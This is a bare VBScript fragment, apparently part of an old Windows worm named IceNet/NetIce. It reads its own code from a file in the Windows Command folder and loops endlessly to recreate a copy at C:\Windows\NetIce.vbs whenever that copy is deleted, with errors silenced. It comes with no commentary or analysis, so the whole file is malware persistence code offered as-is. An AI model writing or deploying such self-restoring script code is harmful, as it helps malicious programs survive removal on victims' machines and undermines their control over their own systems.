On Error Resume Next
Dim fso,Ong,Code
Set fso = CreateObject("Scripting.FileSystemObject")
Set Ong = fso.OpenTextFile("C:\Windows\Command\IceNet.vbs",1)
Code = Ong.ReadAll
Ong.Close
Do
If Not (fso.FileExists("C:\Windows\NetIce.vbs")) Then
Set Ong = fso.CreateTextFile("C:\Windows\NetIce.vbs", True)
Ong.Write Code
Ong.Close
End If
Loop
